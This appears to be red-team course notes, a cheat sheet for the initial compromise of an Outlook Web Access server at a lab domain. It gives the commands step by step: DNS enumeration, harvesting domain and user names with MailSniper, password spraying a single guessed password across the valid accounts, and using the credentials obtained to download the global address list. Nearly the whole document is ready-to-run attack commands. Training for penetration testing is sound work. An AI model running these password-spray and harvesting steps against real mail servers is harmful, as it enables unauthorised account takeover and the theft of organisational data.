# Initial Compromise

Enumerating Outlook Web Access (OWA) to identify valid user and conducting password spray attack

# Identify the mail server of given domain

    $ dig cyberbotic.io
    $ ./dnscan.py -d cyberbotic.io -w subdomains-100.txt

# Idenitfy the NETBIOS name of target domain

    ps> ipmo C:\Tools\MailSniper\MailSniper.ps1
    ps> Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io

# Extract Employee Names (FirstName LastName) and Prepare Username List

    $ ~/namemash.py names.txt > possible.txt

# Validate the username to find active/real usernames

    ps> Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt

# Conduct Password Spraying attack with known Password on identified users

    ps> Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022

# Use Identified credentials to download Global Address List

    ps> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
